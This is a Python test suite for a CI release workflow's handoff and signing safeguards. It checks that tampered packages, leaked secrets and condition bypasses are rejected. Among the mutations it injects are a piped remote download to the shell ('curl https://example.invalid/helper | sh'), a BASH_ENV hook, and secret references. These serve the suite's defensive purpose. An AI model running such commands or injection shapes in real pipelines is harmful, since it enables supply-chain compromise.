#!/usr/bin/env python3
"""Execute the workflow's actual inline handoff checks against adversarial artifacts."""
import copy
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile

import yaml

ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = yaml.safe_load((ROOT / '.github/workflows/official-build.yml').read_text())


def code(job, step):
    body = next(s['run'] for s in WORKFLOW['jobs'][job]['steps'] if s.get('name') == step)
    return body.split("python3 - <<'PY'\n", 1)[1].rsplit('\nPY', 1)[0]


class HandoffControls(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.source = self.root / 'source'
        self.final = self.root / 'final'
        self.scratch = self.root / 'scratch'
        for path in (self.source, self.final, self.scratch):
            path.mkdir()
        self.env = dict(os.environ, GITHUB_REPOSITORY='owner/repo', GITHUB_SHA='a'*40,
                        GITHUB_REF='refs/tags/v1.2.3', GITHUB_RUN_ID='42', GITHUB_RUN_ATTEMPT='2',
                        GITHUB_OUTPUT=str(self.scratch / 'output'), RUNNER_TEMP=str(self.scratch),
                        HANDOFF_ARTIFACT_ID='123', EXPECTED_ARTIFACT_DIGEST='b'*64,
                        RELEASE_CANDIDATE_VERSION='1.2.3')
        (self.source / 'packages').mkdir()
        (self.source / 'sbom').mkdir()
        with zipfile.ZipFile(self.source / 'packages/Widget.1.2.3.nupkg', 'w') as z:
            z.writestr('Widget.nuspec', '<package><metadata><id>Widget</id><version>1.2.3</version></metadata></package>')
            z.writestr('lib/net10.0/Widget.dll', b'original assembly')
        (self.source / 'sbom/bom.json').write_text('{"components": []}')
        self.execute('build-packages', 'Record the unsigned handoff', self.source)
        self.env['HANDOFF_MANIFEST_SHA256'] = (self.scratch / 'output').read_text().strip().split('=', 1)[1]
        shutil.copytree(self.source / 'official-handoff', self.final / 'official-handoff')

    def execute(self, job, step, root=None, succeeds=True):
        result = subprocess.run([sys.executable, '-c', code(job, step)], cwd=root or self.final,
                                env=self.env, capture_output=True, text=True, timeout=20)
        if succeeds:
            self.assertEqual(0, result.returncode, result.stdout + result.stderr)
        else:
            self.assertNotEqual(0, result.returncode, result.stdout + result.stderr)
        return result

    def verify(self, succeeds=True):
        return self.execute('packages', 'Verify unsigned handoff contents', succeeds=succeeds)

    def test_record_and_verify_complete_handoff(self):
        self.verify()
        self.assertTrue((self.final / 'packages/Widget.1.2.3.nupkg').is_file())
        self.execute('packages', 'Verify signing preserved package payloads')

    def test_changed_package_fails(self):
        (self.final / 'official-handoff/packages/Widget.1.2.3.nupkg').write_bytes(b'substituted')
        self.verify(False)

    def test_changed_sbom_fails(self):
        (self.final / 'official-handoff/sbom/bom.json').write_text('altered')
        self.verify(False)

    def test_extra_downloaded_script_fails(self):
        (self.final / 'official-handoff/packages/helper.py').write_text('raise SystemExit(0)')
        self.verify(False)

    def test_missing_file_fails(self):
        (self.final / 'official-handoff/sbom/bom.json').unlink()
        self.verify(False)

    def test_manifest_substitution_fails(self):
        (self.final / 'official-handoff/handoff.json').write_text('{}')
        self.verify(False)

    def test_invocation_binding_fails_for_every_context_field(self):
        for key in ('GITHUB_REPOSITORY', 'GITHUB_SHA', 'GITHUB_REF', 'GITHUB_RUN_ID', 'GITHUB_RUN_ATTEMPT'):
            with self.subTest(key=key):
                original = self.env[key]
                self.env[key] = 'wrong'
                self.verify(False)
                self.env[key] = original

    def test_requested_version_mismatch_fails(self):
        self.env['RELEASE_CANDIDATE_VERSION'] = '9.9.9'
        self.verify(False)

    def test_signature_only_change_preserves_payloads(self):
        self.verify()
        with zipfile.ZipFile(self.final / 'packages/Widget.1.2.3.nupkg', 'a') as z:
            z.writestr('.signature.p7s', b'synthetic signature, no validity claim')
        self.execute('packages', 'Verify signing preserved package payloads')

    def test_signing_payload_change_fails(self):
        self.verify()
        with zipfile.ZipFile(self.final / 'packages/Widget.1.2.3.nupkg', 'w') as z:
            z.writestr('Widget.nuspec', 'changed metadata')
        self.execute('packages', 'Verify signing preserved package payloads', succeeds=False)

    def test_signing_decision_enforces_credential_and_unsigned_policy(self):
        bash = str(Path(os.environ.get('ProgramFiles', 'C:/Program Files')) / 'Git/bin/bash.exe') if os.name == 'nt' else shutil.which('bash')
        self.assertTrue(bash and Path(bash).is_file(), 'Bash is required to execute the signing decision controls')
        script = next(s['run'] for s in WORKFLOW['jobs']['packages']['steps']
                      if s.get('name') == 'Decide whether this build must be signed')
        cases = [
            ('deliberately unsigned', '', '', '1.2.3', 'true', True, 'false'),
            ('required certificate absent', '', '', '1.2.3', 'false', False, 'false'),
            ('unsigned policy absent', '', '', '1.2.3', '', False, 'false'),
            ('nonrelease branch', '', '', '', 'false', True, 'false'),
            ('certificate only', 'synthetic-certificate', '', '1.2.3', 'true', False, 'false'),
            ('password only', '', 'synthetic-password', '1.2.3', 'true', False, 'false'),
            ('partial branch credentials', 'synthetic-certificate', '', '', 'true', False, 'false'),
            ('complete credentials', 'synthetic-certificate', 'synthetic-password', '1.2.3', 'false', True, 'true'),
        ]
        for name, cert, password, version, allow, succeeds, sign in cases:
            with self.subTest(case=name):
                output = self.scratch / 'signing-output'
                output.write_text('')
                env = dict(self.env, GITHUB_OUTPUT=output.as_posix(),
                           NUGET_SIGNING_CERT_BASE64=cert, NUGET_SIGNING_CERT_PASSWORD=password,
                           RELEASE_CANDIDATE_VERSION=version, ALLOW_UNSIGNED_RELEASE=allow)
                result = subprocess.run([bash, '--noprofile', '--norc', '-c', script],
                                        cwd=self.final, env=env, capture_output=True, text=True, timeout=20)
                self.assertEqual(succeeds, result.returncode == 0, result.stdout + result.stderr)
                self.assertEqual('sign=' + sign, output.read_text().splitlines()[-1])

    def test_artifact_metadata_binding(self):
        good = {'id': 123, 'name': 'official-build-handoff-42-2', 'expired': False,
                'workflow_run': {'id': 42, 'head_sha': 'a'*40}, 'digest': 'sha256:'+'b'*64}
        metadata = self.scratch / 'handoff-artifact.json'
        metadata.write_text(json.dumps(good))
        self.execute('packages', 'Verify the handoff artifact identity')
        for key, bad in [('id', 124), ('name', 'official-build-handoff-42-1'), ('expired', True),
                         ('workflow_run', {'id': 41, 'head_sha': 'a'*40}),
                         ('workflow_run', {'id': 42, 'head_sha': 'c'*40}), ('digest', 'sha256:'+'c'*64)]:
            with self.subTest(key=key, bad=bad):
                model = copy.deepcopy(good); model[key] = bad
                metadata.write_text(json.dumps(model))
                self.execute('packages', 'Verify the handoff artifact identity', succeeds=False)

    def test_environment_requires_review_and_ref_restrictions(self):
        good = {'can_admins_bypass': False, 'deployment_branch_policy': {'protected_branches': False, 'custom_branch_policies': True},
                'protection_rules': [{'type': 'required_reviewers', 'reviewers': [{'id': 1}], 'prevent_self_review': True}]}
        rules_path = self.scratch / 'signing-ref-policies.json'
        rules = [{'branch_policies': [{'type': 'branch', 'name': 'main'}, {'type': 'tag', 'name': 'v*'}]}]
        rules_path.write_text(json.dumps(rules))
        metadata = self.scratch / 'signing-environment.json'
        metadata.write_text(json.dumps(good))
        self.execute('packages', 'Verify signing environment protections')
        for key, bad in [('can_admins_bypass', True), ('can_admins_bypass', None),
                         ('deployment_branch_policy', None), ('protection_rules', [])]:
            with self.subTest(key=key):
                model = copy.deepcopy(good); model[key] = bad
                metadata.write_text(json.dumps(model))
                self.execute('packages', 'Verify signing environment protections', succeeds=False)
        metadata.write_text(json.dumps(good))
        for bad in ([{'type': 'branch', 'name': '*'}], [],
                    rules[0]['branch_policies'] + [{'type': 'branch', 'name': 'feature/*'}]):
            rules_path.write_text(json.dumps([{'branch_policies': bad}]))
            self.execute('packages', 'Verify signing environment protections', succeeds=False)
        rules_path.write_text(json.dumps(rules))

        # LIVENESS of the one deliberate relaxation. prevent_self_review enforces that an account
        # OTHER than the triggerer approves, which a single-collaborator repository cannot satisfy --
        # requiring it made an official signed build impossible rather than careful. Permitting it is
        # therefore the intended behaviour, and this arm is what stops the condition being quietly
        # reinstated: if someone re-adds it, this goes red and names the trade instead of a release
        # discovering it.
        for self_review in (False, None):
            with self.subTest(prevent_self_review=self_review):
                model = copy.deepcopy(good)
                model['protection_rules'][0]['prevent_self_review'] = self_review
                metadata.write_text(json.dumps(model))
                self.execute('packages', 'Verify signing environment protections')

        # SAFETY of what the relaxation KEPT. The reviewer gate must still exist and still name
        # somebody: a rule carrying no reviewers is an environment that pauses for nobody, which is
        # indistinguishable from no gate at all. Signing must never proceed unattended.
        for reviewers in ([], None):
            with self.subTest(reviewers=reviewers):
                model = copy.deepcopy(good)
                model['protection_rules'][0]['reviewers'] = reviewers
                metadata.write_text(json.dumps(model))
                self.execute('packages', 'Verify signing environment protections', succeeds=False)
        metadata.write_text(json.dumps(good))

    def test_split_workflow_mutations_are_rejected(self):
        """Each mutation must be caught BY THE ASSERTION IT VIOLATES, not by the digest pin.

        This test used to assert `any(problem.assertion == 'A9' ...)`. Every check in the signing
        family emits A9, and one of them digests the whole privileged job -- so every mutation of
        that job reddened the pin, and all 22 arms passed whether or not the check each one was
        written for existed at all. Two mutations as different as a ref narrowing and an `always()`
        dependency bypass produced byte-identical findings.

        So each arm now names the message it must produce, and asserts it in two separate halves:
        first that the PIN fires (the reviewed surface changed), then -- with the digest re-pinned
        to the mutated job -- that the SPECIFIC assertion fires. Neither half can launder the other.
        """
        spec = importlib.util.spec_from_file_location('promotion', ROOT / 'eng/ci/promotion-contract-gate.py')
        gate = importlib.util.module_from_spec(spec); spec.loader.exec_module(gate)
        workflows, error = gate.load_workflows(str(ROOT / '.github/workflows'))
        self.assertIsNone(error)
        self.assertEqual([], gate.check(workflows), 'the committed tree must satisfy the contract (liveness)')

        def final(w): return w['official-build.yml']['jobs']['packages']
        def source(w): return w['official-build.yml']['jobs']['build-packages']
        def step(w, name): return next(s for s in final(w)['steps'] if s.get('name') == name)

        real = gate.finalizer_contract()
        PIN = 'privileged executable contract changed'

        def repin(w):
            """Re-pin the digest to the MUTATED job, so only the specific check can still fire."""
            model = dict(real)
            model['sha256'] = hashlib.sha256(json.dumps(
                {'job': final(w), 'workflow_env': w['official-build.yml'].get('env', {}),
                 'workflow_defaults': w['official-build.yml'].get('defaults', {})},
                sort_keys=True, separators=(',', ':')).encode()).hexdigest()
            gate.finalizer_contract = lambda: model

        IF_PINNED = 'finalizer run condition must be exactly the reviewed one'
        STEPS_PINNED = 'finalizer steps must be exactly the reviewed list, in order'
        mutations = {
            'source execution must have read-only permissions':
                lambda w: source(w)['permissions'].update({'id-token': 'write'}),
            'source execution must not reference secrets':
                lambda w: source(w).update({'env': {'CERT': '${{ secrets.CERT }}'}}),
            'official source must restrict dispatch refs':
                lambda w: source(w).pop('if'),
            'source steps cannot soften failure':
                lambda w: source(w)['steps'][0].update({'continue-on-error': True}),
            'finalizer requires a fresh hosted runner':
                lambda w: final(w).update({'runs-on': 'self-hosted'}),
            'finalizer authority must be exactly the reviewed set':
                lambda w: final(w)['permissions'].update({'contents': 'write'}),
            'finalizer must use the signing environment':
                lambda w: final(w).pop('environment'),
            'signing secrets must be step-scoped':
                lambda w: final(w)['env'].update({'CERT': '${{ secrets.CERT }}'}),
            'inherited workflow environment must be exactly the reviewed set':
                lambda w: w['official-build.yml']['env'].update({'BASH_ENV': 'official-handoff/hook'}),
            # The unsigned opt-out is a committed decision. Weakening it, or restoring the ambient
            # repository-variable form whose absent value resolved permissive, must be refused.
            'unsigned-release opt-out must be the reviewed committed value': [
                lambda w: final(w)['env'].update({'ALLOW_UNSIGNED_RELEASE': 'false'}),
                lambda w: final(w)['env'].update(
                    {'ALLOW_UNSIGNED_RELEASE': "${{ vars.ALLOW_UNSIGNED_RELEASE || 'true' }}"}),
                lambda w: final(w)['env'].pop('ALLOW_UNSIGNED_RELEASE'),
            ],
            # The producer decides whether to BUILD an unsigned promotable set and the publisher
            # whether to PUSH one. release.yml asks a reader to keep the two in step; nothing
            # enforced it, and a disagreement means every release built unsigned then refused at the
            # last gate before the push, or the reverse.
            'producing build and release workflow must agree on the unsigned-release opt-out':
                lambda w: next(j for j in w['release.yml']['jobs'].values()
                               if 'ALLOW_UNSIGNED_RELEASE' in (j.get('env') or {}))
                              ['env'].update({'ALLOW_UNSIGNED_RELEASE': 'false'}),
            'the release workflow must state its unsigned-release decision':
                lambda w: next(j for j in w['release.yml']['jobs'].values()
                               if 'ALLOW_UNSIGNED_RELEASE' in (j.get('env') or {}))
                              ['env'].pop('ALLOW_UNSIGNED_RELEASE'),
            'finalizer cannot soften its own failure':
                lambda w: final(w).update({'continue-on-error': True}),
            'handoff digest mismatch must fail':
                lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'digest-mismatch': 'warn'}),
            'handoff cannot select another run or repository':
                lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'name': 'other'}),
            'required finalization step has an unexpected skip condition':
                lambda w: step(w, 'Verify unsigned handoff contents').update({'if': 'false'}),
            'finalizer checks cannot soften failure':
                lambda w: step(w, 'Verify unsigned handoff contents').update({'continue-on-error': True}),
            'source must export immutable transfer evidence':
                lambda w: source(w)['outputs'].update({'handoff-id': '123'}),
            'handoff, signing, payload verification and final attestation order is invalid':
                lambda w: final(w)['steps'].reverse(),
            'source must not publish rival package artifacts':
                lambda w: source(w)['steps'].append(
                    {'uses': 'actions/upload-artifact@' + 'a' * 40, 'with': {'name': 'other', 'path': 'packages/'}}),
            # Appending ANY step to the privileged job breaks the reviewed step list. That list sat
            # in the contract read by nothing, so these shapes -- a piped shell download, a source
            # checkout, an unapproved action, build tooling, a downloaded helper -- were caught by
            # the pin alone, by no assertion that could name what had appeared.
            STEPS_PINNED: [
                lambda w: final(w)['steps'].append({'run': 'curl https://example.invalid/helper | sh'}),
                lambda w: final(w)['steps'].append({'uses': 'actions/checkout@' + 'a' * 40}),
                lambda w: final(w)['steps'].append({'uses': 'vendor/action@' + 'a' * 40}),
                lambda w: final(w)['steps'].append({'run': 'dotnet tool restore'}),
                lambda w: final(w)['steps'].append({'run': 'python3 official-handoff/helper.py'}),
            ],
            # THE BYPASS FAMILY. Previously ONE arm (`always()`), which could not be told apart from
            # a safe ref narrowing. Every shape here must be refused -- including the ones a
            # substring scan for 'always(' misses: case, spacing, and the same state spelled as a
            # context rather than a function.
            IF_PINNED: [
                lambda w: final(w).update({'if': 'always()'}),
                lambda w: final(w).update({'if': 'ALWAYS()'}),
                lambda w: final(w).update({'if': 'always ()'}),
                lambda w: final(w).update({'if': '!cancelled()'}),
                lambda w: final(w).update({'if': "needs.build-packages.result != 'cancelled'"}),
                # No status function anywhere, and still refused: reachable where the source
                # condition is false, which is the hole the first narrowing attempt shipped.
                lambda w: final(w).update({'if': "github.event_name == 'workflow_dispatch'"}),
                lambda w: final(w).update(
                    {'if': "startsWith(github.ref, 'refs/tags/v') || github.event_name == 'workflow_dispatch'"}),
                lambda w: final(w).update({'if': 'true'}),
                lambda w: final(w).pop('if'),
            ],
        }

        try:
            for expected, mutate in mutations.items():
                for index, apply_mutation in enumerate(mutate if isinstance(mutate, list) else [mutate]):
                    with self.subTest(expected=expected, variant=index):
                        model = copy.deepcopy(workflows)
                        apply_mutation(model)

                        # HALF 1: the reviewed surface changed, so the pin reports it. Source-only
                        # mutations are exempt -- the pin does not cover the source job, by design.
                        gate.finalizer_contract = lambda: real
                        touches_pinned = (
                            final(model) != final(workflows)
                            or model['official-build.yml'].get('env') != workflows['official-build.yml'].get('env'))
                        if touches_pinned:
                            self.assertIn(PIN, ' | '.join(p.message for p in gate.check(model)))

                        # HALF 2: with the pin satisfied, the specific assertion must still fire.
                        repin(model)
                        messages = [p.message for p in gate.check(model)]
                        self.assertTrue(
                            any(expected in m for m in messages),
                            f'{expected!r} did not fire once the digest was re-pinned; got {messages}')
        finally:
            gate.finalizer_contract = lambda: real

    def test_the_finalizer_condition_implies_the_source_condition(self):
        """The privileged job must not be reachable where its dependency was not.

        No assertion can decide implication between two GitHub expressions, so the contract keeps
        both as exact strings and this test binds the one property that makes the pair safe by eye:
        the finalizer condition appears verbatim inside the source condition. The first attempt at
        narrowing the signing trigger broke exactly this -- `workflow_dispatch` carries no ref
        restriction, so a manual run on an arbitrary branch satisfied the finalizer condition while
        its dependency was skipped."""
        spec = importlib.util.spec_from_file_location('promotion', ROOT / 'eng/ci/promotion-contract-gate.py')
        gate = importlib.util.module_from_spec(spec); spec.loader.exec_module(gate)
        contract = gate.finalizer_contract()
        source_if, finalizer_if = contract['source_if'], contract['finalizer_if']
        self.assertIn(finalizer_if, source_if,
                      'the finalizer condition must be a verbatim disjunct of the source condition')
        for token in ('always', 'failure(', 'cancelled', 'success('):
            self.assertNotIn(token, finalizer_if.lower(),
                             'the finalizer condition must not name a status-check function')
        workflows, error = gate.load_workflows(str(ROOT / '.github/workflows'))
        self.assertIsNone(error)
        jobs = workflows['official-build.yml']['jobs']
        self.assertEqual(source_if, jobs['build-packages']['if'], 'contract and workflow disagree on source_if')
        self.assertEqual(finalizer_if, jobs['packages']['if'], 'contract and workflow disagree on finalizer_if')


if __name__ == '__main__':
    unittest.main(verbosity=2)
